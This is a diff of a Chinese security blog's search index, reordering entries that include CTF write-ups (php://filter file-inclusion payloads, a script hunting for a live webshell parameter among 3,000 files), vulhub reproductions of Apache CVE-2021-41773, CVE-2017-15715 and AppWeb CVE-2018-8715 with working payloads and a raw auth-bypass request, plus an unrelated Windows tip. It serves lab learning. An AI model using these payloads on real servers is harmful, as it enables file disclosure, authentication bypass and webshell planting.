@@ -77,6 +77,49 @@
       </tags>
   </entry>
   <entry>
+    <title>BSidesCF 2020 Had a bad day</title>
+    <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境之后，页面有两个选择</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
+<p>这时候选哪个都会跳出对应的图片（狗或者猫），并且 url 出现变化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6bea1108-6e3e-4c6b-9295-bf25d2c8e728.node4.buuoj.cn:81/index.php?category=meowers</span><br></pre></td></tr></table></figure>
+<p>此时打开源码发现：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
+<p>每刷新一次这个红框里的图片都会变化，因此，可能存在文件包含。</p>
+<h1 id="解题">解题</h1>
+<p>尝试看一下报错有没有信息，发现输入任何东西都只会提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, we currently only support woofers and meowers.</span><br></pre></td></tr></table></figure>
+<p>可是这并不算报错，因此，尝试一下 <code>?category=meowers.php</code>，此时发现报错了！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
+<p>此时，可以确定本题是文件包含，函数为 <code>include()</code>。</p>
+<p>利用伪协议 <code>php://filter</code> 尝试读取一下 <code>index.php</code> ，payload 如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
+<p>发现报错了，报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure></p>
+<p>注意文件名后有两个php，猜测后台在我们传入的参数后面加上了 <code>.php</code>，因此构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
+<p>成功读取源码，base64解码后，将重要内容整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>通过代码审计知道：</p>
+<ol type="1">
+<li>需要传入参数 category</li>
+<li>category 需要包含 <code>woofers</code>， <code>meowers</code>， <code>index</code> 三者之一</li>
+<li>我们传入的文件名不需要包含 .php</li>
+</ol>
+<p>假设我们读取的是 <code>flag</code>，那么我们就要带上上述的第二点的其中一个，这就是本题的难点，有两种payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
+<p>两者都能得到结果（第二个payload就是 <code>php://filter</code> 伪协议嵌套），但是如果使用第二种，会出现报错信息：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
+<p>这里不是很懂，不过根据结果可以猜测，<code>index</code> 的位置上应该放的是 filter 这个伪协议的选项，而index并不是，所以这里报错了，但是这并不影响整体的执行。</p>
+<h1 id="总结">总结</h1>
+<p>通过本题可以学到： <code>php://filter</code> 伪协议的嵌套。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP伪协议</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF 2018 Online Tool</title>
     <url>/2022/03/22/BUUCTF%202018%20Online%20Tool/</url>
     <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
@@ -154,49 +197,6 @@
         <tag>PHP</tag>
         <tag>RCE</tag>
         <tag>nmap命令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BSidesCF 2020 Had a bad day</title>
-    <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，页面有两个选择</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
-<p>这时候选哪个都会跳出对应的图片（狗或者猫），并且 url 出现变化</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6bea1108-6e3e-4c6b-9295-bf25d2c8e728.node4.buuoj.cn:81/index.php?category=meowers</span><br></pre></td></tr></table></figure>
-<p>此时打开源码发现：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
-<p>每刷新一次这个红框里的图片都会变化，因此，可能存在文件包含。</p>
-<h1 id="解题">解题</h1>
-<p>尝试看一下报错有没有信息，发现输入任何东西都只会提示：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, we currently only support woofers and meowers.</span><br></pre></td></tr></table></figure>
-<p>可是这并不算报错，因此，尝试一下 <code>?category=meowers.php</code>，此时发现报错了！</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
-<p>此时，可以确定本题是文件包含，函数为 <code>include()</code>。</p>
-<p>利用伪协议 <code>php://filter</code> 尝试读取一下 <code>index.php</code> ，payload 如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
-<p>发现报错了，报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure></p>
-<p>注意文件名后有两个php，猜测后台在我们传入的参数后面加上了 <code>.php</code>，因此构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
-<p>成功读取源码，base64解码后，将重要内容整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>通过代码审计知道：</p>
-<ol type="1">
-<li>需要传入参数 category</li>
-<li>category 需要包含 <code>woofers</code>， <code>meowers</code>， <code>index</code> 三者之一</li>
-<li>我们传入的文件名不需要包含 .php</li>
-</ol>
-<p>假设我们读取的是 <code>flag</code>，那么我们就要带上上述的第二点的其中一个，这就是本题的难点，有两种payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
-<p>两者都能得到结果（第二个payload就是 <code>php://filter</code> 伪协议嵌套），但是如果使用第二种，会出现报错信息：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
-<p>这里不是很懂，不过根据结果可以猜测，<code>index</code> 的位置上应该放的是 filter 这个伪协议的选项，而index并不是，所以这里报错了，但是这并不影响整体的执行。</p>
-<h1 id="总结">总结</h1>
-<p>通过本题可以学到： <code>php://filter</code> 伪协议的嵌套。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP伪协议</tag>
       </tags>
   </entry>
   <entry>
@@ -431,85 +431,6 @@
       <tags>
         <tag>python</tag>
         <tag>pickle</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>windows 上CD驱动器的删除问题</title>
-    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>个人日常生活中遇到的繁琐的小问题的解决。</p>
-<span id="more"></span>
-<h1 id="问题描述">问题描述</h1>
-<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
-<p>删除也删不掉，打开也打开不了，很烦。</p>
-<h1 id="原因">原因</h1>
-<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
-<p>知道原因后，解决的办法就很简单了。</p>
-<h1 id="问题解决">问题解决</h1>
-<p>首先，以管理员方式打开 <code>UltraISO</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
-<p><code>选项 -&gt; 配置</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
-<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
-<p>然后即可看到 CD驱动器已经消失了。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>Windows小知识</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</title>
-    <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
-<span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
-<ul>
-<li><p>版本等于2.4.49</p></li>
-<li><p>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</p></li>
-</ul>
-<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
-<p>参考链接：</p>
-<ul>
-<li><p>https://httpd.apache.org/security/vulnerabilities_24.html</p></li>
-<li><p>https://twitter.com/ptswarm/status/1445376079548624899</p></li>
-<li><p>https://twitter.com/HackerGautam/status/1445412108863041544</p></li>
-<li><p>https://twitter.com/snyff/status/1445565903161102344</p></li>
-</ul>
-<p>路径：</p>
-<ul>
-<li><code>vulhub-master/httpd/CVE-2021-41773</code></li>
-</ul>
-<p>运行漏洞环境：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build  </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>进入环境，显示如下则环境搭建成功。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231656.png" /></p>
-<p>先刷新，抓个包，然后将请求地址修改为如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231754.png" /></p>
-<p>结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231803.png" /></p>
-<p>成功得到文件的内容，因此证明存在此漏洞。</p>
-<p>需要注意的是，<code>icons</code> 需要为目标主机存在且可访问的目录。<code>%2e</code> 是 <code>.</code> 的 url 编码，如果直接在浏览器输入的话，要输入 <code>.</code> 。</p>
-<p>接下来改变请求的方式，发送如下请求：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232016.png" /></p>
-<p>结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232026.png" /></p>
-<p>成功执行命令。</p>
-<h1 id="总结">总结</h1>
-<p>今天刷的一套题就是类似的路径穿越漏洞（<a href="https://buuoj.cn/challenges">BUUCTF</a> 中的 <strong>我有一个数据库</strong>），这类的题目还是需要平时多记录。</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Apache</tag>
       </tags>
   </entry>
   <entry>
@@ -766,118 +687,32 @@
       </tags>
   </entry>
   <entry>
-    <title>复现：Apache HTTPD 换行解析漏洞（CVE-2017-15715）</title>
-    <url>/2022/03/21/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+    <title>windows 上CD驱动器的删除问题</title>
+    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>个人日常生活中遇到的繁琐的小问题的解决。</p>
 <span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其<strong>2.4.0~2.4.29版本</strong>中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
-<p>Path：https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</p>
-<p>运行漏洞环境： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p>
-<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>上传一个木马，发现被拦截： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094109.png" /></p>
-<p>此时修改 24 行那，首先添加一个字符，然后选定，此时右边会有编码的区域。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094419.png" /></p>
-<p>在 code 那块写上 0a（ascii码表的换行符的16进制），然后点击 <code>apply changes</code> 。此时就加入了一个换行符 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094602.png" /></p>
-<p>然后再次发送该数据包，此时成功发送。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094636.png" /></p>
-<p>访问 <code>http"//ip:8080/shell.php%0a</code>，发现能够访问，说明文件上传成功。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094816.png" /></p>
-<p>利用蚁剑连接 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321094907.png" /></p>
-<p>成功获得 webshell。</p>
-<h1 id="总结">总结</h1>
-<p>查看一下源码（关键部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$name</span> = basename(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ext</span> = pathinfo(<span class="variable">$name</span>,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$ext</span>, [<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;php3&#x27;</span>, <span class="string">&#x27;php4&#x27;</span>, <span class="string">&#x27;php5&#x27;</span>, <span class="string">&#x27;phtml&#x27;</span>, <span class="string">&#x27;pht&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;bad file&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;./&#x27;</span> . <span class="variable">$name</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>换行符绕过了 <code>in_array()</code> 的黑名单过滤。但是 <code>php%0a</code> 并不是 <code>php</code> 文件，不会被执行，这就证明了存在解析漏洞。</p>
-<h1 id="资源">资源</h1>
-<ol type="1">
-<li><a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">vulhub</a></li>
-<li><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715">githubVulhub</a></li>
-</ol>
+<h1 id="问题描述">问题描述</h1>
+<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
+<p>删除也删不掉，打开也打开不了，很烦。</p>
+<h1 id="原因">原因</h1>
+<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
+<p>知道原因后，解决的办法就很简单了。</p>
+<h1 id="问题解决">问题解决</h1>
+<p>首先，以管理员方式打开 <code>UltraISO</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
+<p><code>选项 -&gt; 配置</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
+<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
+<p>然后即可看到 CD驱动器已经消失了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
 ]]></content>
       <categories>
-        <category>漏洞复现</category>
+        <category>Windows</category>
       </categories>
       <tags>
-        <tag>Apache</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>复现：AppWeb认证绕过漏洞（CVE-2018-8715）</title>
-    <url>/2022/03/22/%E5%A4%8D%E7%8E%B0%EF%BC%9AAppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
-<span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
-<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
-<ul>
-<li>basic 传统HTTP基础认证</li>
-<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
-<li>form 表单认证</li>
-</ul>
-<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
-<p>参考链接：</p>
-<ul>
-<li><a href="https://ssd-disclosure.com/index.php/archives/3676">https://ssd-disclosure.com/index.php/archives/3676</a></li>
-</ul>
-<p>路径：</p>
-<ul>
-<li><code>vulhub-master/appweb/CVE-2018-8715</code></li>
-</ul>
-<p>启动环境：</p>
-<ul>
-<li><code>sudo docker-compose up -d</code></li>
-<li>输入 <code>http://ip:8080</code> 即可访问</li>
-</ul>
-<p>前提：</p>
-<ul>
-<li>已知某个用户名为 <code>admin</code></li>
-</ul>
-<h1 id="复现">复现</h1>
-<p>直接访问环境发现需要登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322092115.png" /></p>
-<p>如果随便输入用户名和密码则会显示 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322093702.png" /></p>
-<p>输入用户名 <code>admin</code> 然后抓包，修改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 192.168.100.16:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Authorization: Digest username=&quot;admin&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
-<p>（最后两个空行很重要！）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094537.png" /></p>
-<p>获得cookie（经过测试，每发一次上述的数据包，session的值就会+1，并且后面也会有所变化）</p>
-<ul>
-<li><code>-http-session-=10::http.session::e0fff8835e6f7cfd1848635e08ecb006</code></li>
-</ul>
-<p>再次输入 <code>admin</code> 然后抓包，设置 cookie 字段。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094645.png" /></p>
-<p>成功登录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322094704.png" /></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>AppWeb</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强网杯 2019 高明的黑客</title>
-    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境，得到如下信息</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
-<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
-<p>发现有 3002 个文件，并且除了一个 <code>index.html</code> 之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code> <code>system</code> ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
-<p>因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。</p>
-<h1 id="解题">解题</h1>
-<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span 